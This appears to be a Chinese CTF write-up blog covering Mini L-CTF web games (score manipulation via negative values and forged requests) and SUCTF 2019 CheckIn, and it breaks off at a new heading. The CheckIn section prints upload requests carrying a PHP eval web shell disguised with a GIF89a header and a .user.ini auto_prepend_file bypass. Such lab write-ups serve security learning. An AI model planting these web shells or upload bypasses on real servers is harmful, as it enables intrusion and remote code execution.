    <content type="html"><![CDATA[<h1 id="Mini-L-CTF-GuessOneGuess"><a href="#Mini-L-CTF-GuessOneGuess" class="headerlink" title="Mini L-CTF GuessOneGuess"></a>Mini L-CTF GuessOneGuess</h1><p>下载源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">io</span>) </span>&#123;<br>    io.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, (socket) =&gt; &#123;<br>        let targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        let guessCount = <span class="hljs-number">0</span>;<br>        let totalScore = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.env.FLAG || <span class="hljs-string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;<br>        console.<span class="hljs-title function_ invoke__">log</span>(`新连接 - 目标数字: $&#123;targetNumber&#125;`);<br><br>    <br>        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;猜一个1-100之间的数字！&#x27;</span>,<br>            <span class="hljs-attr">score</span>: totalScore<br>        &#125;);<br><br>        <br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, (data) =&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>              console.<span class="hljs-title function_ invoke__">log</span>(totalScore);<br>                <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">guess</span> = <span class="hljs-title function_ invoke__">parseInt</span>(data.value);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isNaN</span>(guess)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入有效数字&#x27;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (guess &lt; <span class="hljs-number">1</span> || guess &gt; <span class="hljs-number">100</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入1-100之间的数字&#x27;</span>);<br>                &#125;<br><br>                guessCount++;<br><br>                <span class="hljs-keyword">if</span> (guess === targetNumber) &#123;<br>                   <br>                    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">currentScore</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-number">100</span> / Math.<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>, guessCount - <span class="hljs-number">1</span>));<br>                    totalScore += currentScore;<br><br>                    let message = `🎉 猜对了！得分 +$&#123;currentScore&#125; (总分数: $&#123;totalScore&#125;)`;<br>                    let showFlag = <span class="hljs-literal">false</span>;<br><br>                    <span class="hljs-keyword">if</span> (totalScore &gt; <span class="hljs-number">1.7976931348623157e308</span>) &#123;<br>                        message += `\n🏴 $&#123;FLAG&#125;`;<br>                        showFlag = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>                        <span class="hljs-attr">message</span>: message,<br>                        <span class="hljs-attr">score</span>: totalScore,<br>                        <span class="hljs-attr">showFlag</span>: showFlag,<br>                        <span class="hljs-attr">currentScore</span>: currentScore<br>                    &#125;);<br><br>                    <br>                    targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>                    console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>                    guessCount = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (guessCount &gt;= <span class="hljs-number">100</span>) &#123;<br>                      console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>);<br>                        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;punishment&#x27;</span>, &#123;<br>                            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>,<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">message</span>: guess &lt; targetNumber ? <span class="hljs-string">&#x27;太小了！&#x27;</span> : <span class="hljs-string">&#x27;太大了！&#x27;</span>,<br>                        <span class="hljs-attr">score</span>: totalScore<br>                    &#125;);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>                socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>                    <span class="hljs-attr">message</span>: err.message,<br>                    <span class="hljs-attr">score</span>: totalScore<br>                &#125;);<br>            &#125;<br>        &#125;);<br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, (data) =&gt; &#123;<br>          totalScore -= data.score;<br>          guessCount = <span class="hljs-number">0</span>;<br>          targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>          console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>          socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>            <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;扣除分数并重置&quot;</span>,<br>            <span class="hljs-attr">score</span>: totalScore,<br>            <span class="hljs-attr">showFlag</span>: <span class="hljs-literal">false</span>,<br>          &#125;);<br><br>        &#125;);<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意到最后有一项猜错一百次后删除分数的函数<br>这个分数是data,为上传的data  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">totalScore -<span class="hljs-operator">=</span> data.score<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>我们上传一个负数，根据源码里的减去，就能实现负负得正，获得足够分数<br>之后的totalScore是足够分数来输出flag的<br>此时再猜对一次触发输出flag即可  </p><p>操作过程：<br>输入1 然后bp抓包重发99次，<br>在99次时把上传的分数改为：  </p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;42</span>[<span class="hljs-string">&quot;punishment-response&quot;</span>,&#123;<span class="hljs-string">&quot;score&quot;</span>:-1e309&#125;]&#x27;<br></code></pre></td></tr></table></figure><p>此时服务器里的数组已经达到发送flag的数值了，但是要触发分数检测然后输出flag需要猜对一次，<br>所以再猜对一次即可  </p><p>实测直接使用punishment事件就可以直接上传分数了<br>不用错一百次  </p><h1 id="Mini-L-CTF-麦霸评分"><a href="#Mini-L-CTF-麦霸评分" class="headerlink" title="Mini L_CTF 麦霸评分"></a>Mini L_CTF 麦霸评分</h1><p>题目给了源码<br>看到源码里有获取原音频的地址：<br>&#x2F;original.wav  </p><p>提交录音的地址：<br>&#x2F;compare-recording  </p><p>那直接把原音提交即可  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 1. 直接请求原版音频（替换为实际音频路径）</span><br>audio_url = <span class="hljs-string">&quot;http://127.0.0.1:37563/original.wav&quot;</span>  <span class="hljs-comment"># </span><br>audio = requests.get(audio_url).content<br><br><span class="hljs-comment"># 2. 伪装成用户录音提交</span><br>r = requests.post(<br>    <span class="hljs-string">&quot;http://127.0.0.1:37563/compare-recording&quot;</span>, <span class="hljs-comment"># </span><br>    files=&#123;<span class="hljs-string">&quot;audio&quot;</span>: (<span class="hljs-string">&quot;recording.wav&quot;</span>, audio)&#125;<br>)<br>a=requests.get(audio_url).headers<br><br><span class="hljs-comment"># 3. 提取flag</span><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>给deepseek一眼顶针了，在浏览器控制台运行就行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getFlag</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 替换成上一步获取的真实URL（示例：/original.wav?sign=abc123）</span><br>  <span class="hljs-keyword">const</span> serverPath = <span class="hljs-string">&#x27;/original.wav?sign=abc123&#x27;</span>; <br><br>  <span class="hljs-comment">// 直接使用服务器路径获取音频</span><br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(serverPath);<br>  <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();<br><br>  <span class="hljs-comment">// 提交到评分接口</span><br>  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;audio&#x27;</span>, blob, <span class="hljs-string">&#x27;recording.wav&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/compare-recording&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">body</span>: formData &#125;);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span>) <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;FLAG: &#x27;</span> + data.<span class="hljs-property">flag</span>);<br>&#125;<br><br><span class="hljs-comment">// 添加冷却时间绕过</span><br><span class="hljs-built_in">setTimeout</span>(getFlag, <span class="hljs-number">11000</span>); <span class="hljs-comment">// 等待11秒后执行</span><br></code></pre></td></tr></table></figure><h1 id="Mini-L-CTF-吃豆人"><a href="#Mini-L-CTF-吃豆人" class="headerlink" title="Mini L-CTF 吃豆人"></a>Mini L-CTF 吃豆人</h1><p>查看源码，得到上传的地址，<br>直接传  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/submit_score</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">29530</span><span class="hljs-symbol">/</span><br>Content-type:application<span class="hljs-symbol">/json</span><br><br>&#123;<br><span class="hljs-string">&quot;score&quot;</span>:<span class="hljs-number">50000</span><br>&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>前端可以自己改，还有注释，有很多方法解<br>比如前端找到吃豆逻辑吧吃一个蓝豆改为100000000直接拿到  </p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><p>这次换个文件头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure><p>回显  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 